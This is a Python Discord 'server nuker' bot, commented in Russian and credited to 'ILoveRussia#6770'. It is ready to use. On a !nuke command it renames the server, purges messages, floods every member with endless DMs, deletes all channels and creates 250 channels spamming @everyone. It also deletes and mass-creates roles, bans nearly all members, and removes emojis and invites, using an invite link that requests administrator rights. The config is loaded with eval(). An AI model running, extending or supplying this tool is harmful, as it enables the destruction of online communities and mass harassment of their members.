config_example = '''
{
    # Токен бота
    'BOT_TOKEN': 'ТОКЕН БОТА',

    # Префикс для команд бота
    'BOT_COMMAND_PREFIX': '!',

    # Имя для каналов крашера
    'CHANNELS_NAME': 'КРАШ СЕРВЕРА',

    # Текст для спама
    'SPAM_TEXT': '@everyone ВЫПОЛНЯЕТСЯ КРАШ СЕРВЕРА! :clown:',

    # Причина для бана
    'BAN_REASON': 'Просто так',

    # Новое имя для сервера
    'RENAME_SERVER_TO': 'СЕРВЕР КРАШНУТ🤡',

    # Новое имя для ролей
    'ROLES_NAME': 'КРАШ',

    # Спам участникам в ЛС
    'DM_SPAM': 'ВЫПОЛНЯЕТСЯ КРАШ СЕРВЕРА!',

    # Сообщение при запуске крашера
    'NUKER_START_MESSAGE': 'ЭТОТ СЕРВЕР КРАШИТСЯ :clown:. Вашему серверу капец!',

    # Отправлять ли стартовое сообщение?
    'SHOW_START_MESSAGE': True,

    'NUKER_OPTIONS': {
        # Переименовывать сервер?
        'RENAME_GUILD': True,

        # Очистить сообщения?
        'PURGE': True,

        # Спамить участникам в ЛС?
        'FLOOD_DM': True,

        # Удалить все каналы, и создать новые со спамом?
        'CREATE_AND_SPAM_CHANNELS': True,

        # Пересоздать ли роли?
        'CDROLES': True,

        # Банить ли участников?
        'BAN_MEMBERS': True,

        # Удалять ли эмодзи?
        'DELETE_EMOJIS': True,

        # Удалять ли приглашения?
        'DELETE_INVITES': True,

        # Спамить ли на всех каналах?
        'TOTAL_SPAM': True
    },

    # Участники, которых не нужно банить.
    'BAN_EXCLUDES': []
}
'''

from os import _exit, name, system
from os.path import isfile

clear = lambda: system('cls' if name == 'nt' else 'clear')

from colorama import Fore

clear()


def MESSAGE():
    print(Fore.RED + '''███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝
██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n''')


while True:

    print(
        f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Если у вас нет файла с конфигом, введите название несуществующего файла.\n'
    )

    config = input(
        f'{Fore.YELLOW}Введите имя файла с конфигом {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
    )

    if isfile(config):
        break
    else:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл не найден!'
        )

        while True:
            ask = input(
                f'{Fore.YELLOW}Желаете ли вы создать файл с примером? (Y/N) {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
            ).lower()
            if ask not in ('y', 'n'):
                print(
                    f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Введите Y или N.'
                )
            else:
                if ask == 'n':
                    print(
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Действие отменено.'
                    )
                    break
                elif ask == 'y':
                    file = open('nuker.py', 'w', encoding='utf-8')
                    file.write(config_example)
                    file.close()
                    print(
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл создан в ./nuker.py, отредактируйте токен и запустите скрипт.{Fore.WHITE}'
                    )
                    _exit(0)

try:
    config = open(config, 'r', encoding='utf-8')
    data = eval(config.read())
    config.close()

    keys = list(data.keys())

    if 'BOT_TOKEN' not in keys:
        raise NameError('BOT_TOKEN не найден в конфиге')
    if 'BOT_COMMAND_PREFIX' not in keys:
        raise NameError('BOT_COMMAND_PREFIX не найден в конфиге')
    if 'CHANNELS_NAME' not in keys:
        raise NameError('CRESHER_CHANNELS_NAME не найден в конфиге')
    if 'SPAM_TEXT' not in keys:
        raise NameError('SPAM_TEXT не найден в конфиге')
    if 'BAN_REASON' not in keys:
        raise NameError('BAN_REASON не найден в конфиге')
    if 'RENAME_SERVER_TO' not in keys:
        raise NameError('RENAME_SERVER_TO не найден в конфиге')
    if 'ROLES_NAME' not in keys:
        raise NameError('ROLES_NAME не найден в конфиге')
    if 'DM_SPAM' not in keys:
        raise NameError('SM_SPAM не найден в конфиге')
    if 'NUKER_START_MESSAGE' not in keys:
        raise NameError('NUKER_START_MESSAGE не найден в конфиге')
    if 'SHOW_START_MESSAGE' not in keys:
        raise NameError('SHOW_START_MESSAGE не найден в конфиге')
    if 'BAN_EXCLUDES' not in keys:
        raise NameError('BAN_EXCLUDES не найден в конфиге')
    if 'NUKER_OPTIONS' not in keys:
        raise NameError('NUKER_OPTIONS не найден в конфиге')

    keys = list(data['NUKER_OPTIONS'].keys())

    if 'RENAME_GUILD' not in keys:
        raise NameError('NUKER_OPTIONS|RENAME_GUILD не найден в конфиге')
    if 'PURGE' not in keys:
        raise NameError('NUKER_OPTIONS|PURGE не найден в конфиге')
    if 'FLOOD_DM' not in keys:
        raise NameError('NUKER_OPTIONS|FLOOD_DM не найден в конфиге')
    if 'CREATE_AND_SPAM_CHANNELS' not in keys:
        raise NameError(
            'NUKER_OPTIONS|CREATE_AND_SPAM_CHANNELS не найден в конфиге')
    if 'CDROLES' not in keys:
        raise NameError('NUKER_OPTIONS|CDROLES не найден в конфиге')
    if 'BAN_MEMBERS' not in keys:
        raise NameError('NUKER_OPTIONS|BAN_MEMBERS не найден в конфиге')
    if 'DELETE_EMOJIS' not in keys:
        raise NameError('NUKER_OPTIONS|DELETE_EMOJIS не найден в конфиге')
    if 'DELETE_INVITES' not in keys:
        raise NameError('NUKER_OPTIONS|DELETE_INVITES не найден в конфиге')
except Exception as e:
    print(
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Ошибка чтения конфига: {e}{Fore.WHITE}'
    )
    _exit(0)

from threading import Thread
from time import sleep

from keyboard import is_pressed

system('title SERVER NUKER')

clear()

MESSAGE()

print(Fore.YELLOW + 'SERVER NUKER by ILoveRussia#6770\n\nЗапуск...')

import asyncio

asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

from discord.ext import commands

client = commands.Bot(command_prefix=data['BOT_COMMAND_PREFIX'])


async def CREATE_ROLE(ctx):
    try:
        await ctx.guild.create_role(name=data['ROLES_NAME'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создана роль')
    except:
        pass


async def DELETE_OBJECT(OBJECT):
    try:
        await OBJECT.delete()
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Удалено: {OBJECT}')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Не удалось удалить: {OBJECT}'
        )


async def BAN(MEMBER):
    try:
        await MEMBER.ban(reason=data['BAN_REASON'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Забанен: {MEMBER}')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Не удалось забанить: {MEMBER}'
        )


async def CM_DELETE_ROLES(ctx):
    try:
        for role in ctx.guild.roles:
            asyncio.create_task(DELETE_OBJECT(role))
    except:
        pass


async def CM_CREATE_ROLES(ctx):
    try:
        for x in range(250):
            asyncio.create_task(CREATE_ROLE(ctx))
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию ролей'
        )
    except:
        pass


async def NEW_CHANNEL(ctx):
    try:
        channel = await ctx.guild.create_text_channel(data['CHANNELS_NAME'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан канал')

        if data['NUKER_OPTIONS']['TOTAL_SPAM']:
            while True:
                await channel.send(data['SPAM_TEXT'])
    except:
        pass


async def CM_CDCHANNELS(ctx):
    try:
        for CHANNEL in ctx.guild.channels:
            asyncio.create_task(DELETE_OBJECT(CHANNEL))
            print(f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Удалён канал')
        for x in range(250):
            asyncio.create_task(NEW_CHANNEL(ctx))
            print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан новый канал')
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию каналов'
        )
    except:
        raise


async def CM_MEMBER_BAN(ctx):
    for member in ctx.guild.members:
        if (member.name + "#" +
                str(member.discriminator)) not in data['BAN_EXCLUDES']:

            asyncio.create_task(BAN(member))


async def CM_RENAME_GUILD(ctx):
    await ctx.guild.edit(name=data['RENAME_SERVER_TO'])
    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Сервер переименован')


async def DM_USER(ctx, member):
    try:
        while True:
            await member.send(data['DM_SPAM'])
    except:
        print(
            Fore.RED +
            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: Не удалось запустить флуд в лс'
        )


async def CM_FLOOD_DM(ctx):
    for member in ctx.guild.members:
        asyncio.create_task(DM_USER(ctx, member))


async def CM_PURGE(ctx):
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass


async def CM_DELETE_ALL_EMOJIS(ctx):
    for emoji in ctx.guild.emojis:
        asyncio.create_task(DELETE_OBJECT(emoji))


async def CM_DELETE_ALL_INVITES(ctx):
    for invite in await ctx.guild.invites():
        asyncio.create_task(DELETE_OBJECT(invite))
    print(
        Fore.RED +
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Созданы задачи по удалению всех приглашений'
    )


@client.command()
async def nuke(ctx):
    clear()

    await ctx.message.delete()

    if data['SHOW_START_MESSAGE']:
        await ctx.send(data['NUKER_START_MESSAGE'])
        await asyncio.sleep(3)

    if data['NUKER_OPTIONS']['RENAME_GUILD']:
        asyncio.create_task(CM_RENAME_GUILD(ctx))

    if data['NUKER_OPTIONS']['PURGE']:
        asyncio.create_task(CM_PURGE(ctx))

    if data['NUKER_OPTIONS']['FLOOD_DM']:
        asyncio.create_task(CM_FLOOD_DM(ctx))

    if data['NUKER_OPTIONS']['CREATE_AND_SPAM_CHANNELS']:
        asyncio.create_task(CM_CDCHANNELS(ctx))

    if data['NUKER_OPTIONS']['CDROLES']:
        asyncio.create_task(CM_DELETE_ROLES(ctx))
        asyncio.create_task(CM_CREATE_ROLES(ctx))

    if data['NUKER_OPTIONS']['BAN_MEMBERS']:
        asyncio.create_task(CM_MEMBER_BAN(ctx))

    if data['NUKER_OPTIONS']['DELETE_EMOJIS']:
        asyncio.create_task(CM_DELETE_ALL_EMOJIS(ctx))

    if data['NUKER_OPTIONS']['DELETE_INVITES']:
        asyncio.create_task(CM_DELETE_ALL_INVITES(ctx))


def KEYBOARD_LISTENER():
    while True:
        if is_pressed('F12'):
            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Программа остановлена{Fore.WHITE}'
            )
            _exit(0)

        sleep(.05)


@client.event
async def on_ready():
    clear()

    Thread(target=lambda: KEYBOARD_LISTENER()).start()

    if len(client.guilds) == 0:
        print(Fore.RED + f'Бот не приглашён ни на один сервер!\n')
        print(
            Fore.RED +
            f'Пригласите бота на сервер, используя ссылку {Fore.GREEN}\nhttps://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot\n\n{Fore.RED}И запустите скрипт заново.'
        )
        input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ')
        print(Fore.WHITE)

        _exit(0)

    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}F12: Остановить\n')

    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Логин: {Fore.GREEN}{client.user.name}{Fore.RED}#{Fore.GREEN}{client.user.discriminator}'
    )
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Кол-во серверов: {Fore.GREEN}{len(client.guilds)}'
    )
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Префикс команд: {Fore.GREEN}{client.command_prefix}\n'
    )

    print(Fore.YELLOW +
          f'{client.command_prefix}{Fore.RED}nuke{Fore.YELLOW} - запуск')


try:
    client.run(data['BOT_TOKEN'])
except:
    clear()
    print(
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Неверный токен{Fore.WHITE}'
    )
    input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ')
